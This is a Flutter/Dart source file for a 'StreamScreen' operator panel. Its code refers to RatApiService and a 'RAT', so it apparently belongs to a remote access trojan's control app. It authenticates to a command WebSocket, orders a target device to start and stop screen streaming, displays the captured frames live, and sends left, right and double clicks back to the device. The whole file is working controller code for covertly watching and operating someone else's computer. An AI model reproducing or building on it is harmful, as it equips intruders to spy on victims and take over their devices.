import '../services/api_config.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/io.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'api_service.dart';
import 'constants.dart';

const _kBg   = Color(0xFF111827);
const _kCard = Color(0xFF1F2937);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kRed  = Color(0xFFEF4444);
const _kSub  = Color(0xFF9CA3AF);

class StreamScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const StreamScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<StreamScreen> createState() => _StreamScreenState();
}

class _StreamScreenState extends State<StreamScreen> {
  late RatApiService _api;
  bool _isStreaming = false, _isLoading = false;
  String _status = 'Stream not started';
  Uint8List? _frame;
  WebSocketChannel? _channel;
  StreamSubscription? _sub;
  int _frameCount = 0;
  DateTime? _startTime;

  @override
  void initState() { super.initState(); _api = RatApiService(widget.sessionKey); }

  @override
  void dispose() { _closeWs(); if (_isStreaming) _stop(); super.dispose(); }

  void _closeWs() { _sub?.cancel(); _channel?.sink.close(); _channel = null; }

  Future<void> _start2() async {
    setState(() { _isLoading = true; _status = 'Connecting WebSocket...'; });
    try {
      _channel = IOWebSocketChannel.connect(Uri.parse(RatConstants.wsUrl), headers: ApiConfig.getHeaders());
      _channel!.sink.add('ADMIN_HANDSHAKE:${widget.sessionKey}:${widget.deviceId}');
      _sub = _channel!.stream.listen((data) {
        if (data is String) {
          if (data == 'ADMIN_AUTH:SUCCESS') setState(() => _status = 'Authenticated');
          else if (data.startsWith('VSTREAM:')) {
            final bytes = base64Decode(data.substring(8));
            setState(() { _frame = bytes; _frameCount++; });
          }
        }
      }, onError: (e) => setState(() => _status = 'WS Error: $e'),
         onDone:  () { if (_isStreaming) { setState(() => _status = 'Disconnected'); _stop(localOnly: true); } });
      await _api.sendCommand(widget.deviceId, 'START_STREAM');
      setState(() { _isStreaming = true; _isLoading = false; _status = 'Stream active'; _startTime = DateTime.now(); _frameCount = 0; });
    } catch (e) { setState(() { _status = 'Error: $e'; _isLoading = false; }); }
  }

  Future<void> _stop({bool localOnly = false}) async {
    setState(() { _isLoading = true; _status = 'Stopping...'; });
    _closeWs();
    if (!localOnly) await _api.sendCommand(widget.deviceId, 'STOP_STREAM');
    setState(() { _isStreaming = false; _isLoading = false; _status = 'Stream stopped'; _frame = null; });
  }

  void _sendInput(Offset position, BoxConstraints constraints, String type) {
    if (!_isStreaming || _channel == null) return;

    // Aspect ratio optimization (Assuming 16:9 from RAT)
    const double imgAspect = 16 / 9;
    final double screenAspect = constraints.maxWidth / constraints.maxHeight;

    double dx = position.dx;
    double dy = position.dy;
    double rw = constraints.maxWidth;
    double rh = constraints.maxHeight;

    if (screenAspect > imgAspect) {
      // Pillerbox (black bars on sides)
      double actualWidth = rh * imgAspect;
      dx -= (rw - actualWidth) / 2;
      rw = actualWidth;
    } else {
      // Letterbox (black bars on top/bottom)
      double actualHeight = rw / imgAspect;
      dy -= (rh - actualHeight) / 2;
      rh = actualHeight;
    }

    double xRel = (dx / rw).clamp(0.0, 1.0);
    double yRel = (dy / rh).clamp(0.0, 1.0);

    _channel!.sink.add('INPUT:$xRel:$yRel:$type');
  }

  String _duration() {
    if (_startTime == null) return '00:00';
    final d = DateTime.now().difference(_startTime!);
    return '${d.inMinutes.toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Column(children: [
          // Header
          Container(
            padding: const EdgeInsets.fromLTRB(16, 12, 16, 12),
            decoration: BoxDecoration(color: _kCard.withOpacity(0.95), border: Border(bottom: BorderSide(color: _kBlue.withOpacity(0.2)))),
            child: Row(children: [
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
              ),
              const SizedBox(width: 12),
              Container(
                width: 8, height: 8,
                decoration: BoxDecoration(color: _isStreaming ? _kRed : _kSub, shape: BoxShape.circle, boxShadow: _isStreaming ? [BoxShadow(color: _kRed, blurRadius: 6)] : []),
              ),
              const SizedBox(width: 10),
              Text(_isStreaming ? 'LIVE STREAM' : 'Screen Stream', style: TextStyle(color: _isStreaming ? _kRed : Colors.white, fontWeight: FontWeight.w700, fontSize: 16)),
              const Spacer(),
              if (_isStreaming) Text(_duration(), style: const TextStyle(color: _kSub, fontSize: 12)),
            ]),
          ),

          // Stats bar when streaming
          if (_isStreaming)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              color: _kCard.withOpacity(0.7),
              child: Row(mainAxisAlignment: MainAxisAlignment.spaceAround, children: [
                _stat(Icons.timer_rounded, _duration()),
                Container(width: 1, height: 24, color: Colors.white12),
                _stat(Icons.image_rounded, '$_frameCount frames'),
                Container(width: 1, height: 24, color: Colors.white12),
                _stat(Icons.speed_rounded, '~2 FPS'),
              ]),
            ),

          // Preview
          Expanded(
            child: Container(
              decoration: BoxDecoration(
                color: Colors.black,
                border: Border.all(color: _isStreaming ? _kBlue.withOpacity(0.3) : Colors.transparent, width: 1),
              ),
              child: _isLoading
                ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    const CircularProgressIndicator(color: _kBlue, strokeWidth: 2),
                    const SizedBox(height: 12),
                    Text(_status, style: const TextStyle(color: _kSub, fontSize: 12)),
                  ]))
                : _isStreaming && _frame != null
                  ? LayoutBuilder(builder: (context, constraints) {
                      return GestureDetector(
                        onTapDown: (details) {
                          _sendInput(details.localPosition, constraints, "L-CLICK");
                        },
                        onLongPressStart: (details) {
                          _sendInput(details.localPosition, constraints, "R-CLICK");
                        },
                        onDoubleTapDown: (details) {
                          _sendInput(details.localPosition, constraints, "D-CLICK");
                        },
                        child: Stack(children: [
                          Image.memory(_frame!, gaplessPlayback: true, fit: BoxFit.contain, width: double.infinity, height: double.infinity,
                            errorBuilder: (_, __, ___) => const Center(child: Text('Frame error', style: TextStyle(color: _kRed)))),
                          Positioned(top: 12, left: 12, child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                            decoration: BoxDecoration(color: _kRed.withOpacity(0.9), borderRadius: BorderRadius.circular(20)),
                            child: Row(mainAxisSize: MainAxisSize.min, children: [
                              Container(width: 6, height: 6, decoration: const BoxDecoration(color: Colors.white, shape: BoxShape.circle)),
                              const SizedBox(width: 5),
                              const Text('LIVE STREAM', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 10)),
                            ]),
                          )),
                          Positioned(bottom: 12, right: 12, child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                            decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(20), border: Border.all(color: Colors.white12)),
                            child: const Text('Touch to Control', style: TextStyle(color: Colors.white70, fontSize: 10)),
                          )),
                        ]),
                      );
                    })
                  : Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                      Icon(Icons.screen_share_rounded, size: 64, color: Colors.white.withOpacity(0.1)),
                      const SizedBox(height: 12),
                      Text(_status, style: const TextStyle(color: _kSub, fontSize: 13)),
                    ])),
            ),
          ),

          // Control button
          Padding(
            padding: const EdgeInsets.all(16),
            child: GestureDetector(
              onTap: _isLoading ? null : (_isStreaming ? _stop : _start2),
              child: Container(
                width: double.infinity,
                padding: const EdgeInsets.symmetric(vertical: 16),
                decoration: BoxDecoration(
                  gradient: _isLoading ? null : LinearGradient(colors: _isStreaming ? [_kRed, const Color(0xFFDC2626)] : [_kBlue, _kCyan]),
                  color: _isLoading ? Colors.grey.shade800 : null,
                  borderRadius: BorderRadius.circular(14),
                  boxShadow: _isLoading ? [] : [BoxShadow(color: (_isStreaming ? _kRed : _kBlue).withOpacity(0.4), blurRadius: 16)],
                ),
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  _isLoading
                    ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                    : Icon(_isStreaming ? Icons.stop_rounded : Icons.play_arrow_rounded, color: Colors.white, size: 22),
                  const SizedBox(width: 10),
                  Text(_isStreaming ? 'Stop Stream' : 'Start Stream', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 15)),
                ]),
              ),
            ),
          ),
        ]),
      ),
    );
  }

  Widget _stat(IconData icon, String val) => Column(children: [
    Icon(icon, color: _kBlue, size: 16),
    const SizedBox(height: 2),
    Text(val, style: const TextStyle(color: Colors.white70, fontSize: 10, fontWeight: FontWeight.w600)),
  ]);
}
